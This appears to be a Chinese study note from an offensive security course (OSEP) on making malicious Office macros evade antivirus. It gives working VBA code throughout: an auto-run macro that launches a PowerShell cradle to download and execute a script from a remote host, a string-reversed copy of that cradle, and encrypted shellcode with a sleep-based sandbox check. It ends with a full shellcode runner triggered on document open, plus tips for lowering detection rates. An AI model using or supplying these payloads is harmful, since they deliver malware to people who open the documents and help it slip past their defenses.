---
title: OSEP-07-VBA宏绕过杀软技术
description: '07-杀软绕过 | 05-VBA宏绕过杀软技术'
pubDate: 2026-01-30T00:01:04+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# VBA 宏绕过杀软技术

## VBA Stomping 技术

### 原理

Microsoft Office 文档中的 VBA 代码存储为两种形式：
1. **P-code** - 预编译的二进制代码
2. **VBA 源代码** - 文本形式的代码

如果 Office 版本匹配，只执行 P-code，忽略源代码。

### 工作流程

```
1. 创建包含宏的文档
   ↓
2. 使用 FlexHEX 打开文档
   ↓
3. 定位 VBA 源代码
   ↓
4. 用零字节覆盖源代码
   ↓
5. 保存文档
   ↓
6. P-code 仍然执行，但源代码被移除
```

### 使用 FlexHEX

1. 打开 FlexHEX
2. File → Open → OLE Compound File
3. 展开 Macros/VBA 文件夹
4. 找到 NewMacros 文件
5. 定位 "Attribute VB_Name" 开始的源代码
6. Edit → Insert Zero Block 覆盖

### 使用 EvilClippy 自动化

```cmd
EvilClippy.exe -s document.doc
```

### 检测率对比

| 版本 | 检测率 |
|------|--------|
| 原始 VBA | 7/26 |
| VBA Stomping | 4/26 |

## WMI 进程解链

### 问题

直接使用 Shell 创建 PowerShell 会成为 Word 的子进程，容易被检测。

### 解决方案

使用 WMI 创建进程，PowerShell 成为 WmiPrvSE.exe 的子进程。

### 代码实现

```vba
Sub MyMacro()
    Dim strArg As String
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

### 进程树对比

**使用 Shell:**
```
WINWORD.EXE
└── powershell.exe  ← 可疑
```

**使用 WMI:**
```
WmiPrvSE.exe
└── powershell.exe  ← 正常
```

## 字符串混淆

### StrReverse 混淆

```vba
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub MyMacro()
    Dim strArg As String
    ' 反转的字符串
    strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

### Caesar 加密混淆

```vba
' 加密后的 shellcode
' 实际使用时替换为完整加密字节；不要把省略号放进 Array。
buf = Array(234, 132, 2, 2, 2, 98, 139, 231)

' 解密
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i
```

### 变量名混淆

```vba
' 使用无意义的变量名
Dim a1b2c3 As String
Dim x9y8z7 As Long
```

## Sleep 延迟检测

```vba
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Sub MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep(2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Sub
    End If

    ' 执行恶意代码...
End Sub
```

## 完整绕过示例

```vba
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long)
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Function mymacro()
    ' 1. 延迟检测
    Dim t1 As Date
    t1 = Now()
    Sleep(2000)
    If DateDiff("s", t1, Now()) < 2 Then Exit Function

    ' 2. 加密的 shellcode
    Dim buf As Variant
    ' 实际使用时替换为完整加密字节；不要把省略号放进 Array。
    buf = Array(234, 132, 2, 2, 2, 98, 139, 231)

    ' 3. 解密
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    ' 4. 执行
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
```

## 检测率总结

| 技术组合 | 检测率 |
|----------|--------|
| 原始 VBA shellcode runner | 7/26 |
| + Caesar 加密 | 7/26 |
| + Sleep 延迟 | 7/26 |
| + VBA Stomping | 4/26 |
| + WMI 解链 + 混淆 | 更低 |

## 最佳实践

1. **组合多种技术** - 单一技术效果有限
2. **匹配目标 Office 版本** - VBA Stomping 需要版本匹配
3. **测试多个杀软** - 不同杀软检测不同
4. **定期更新** - 杀软规则会更新
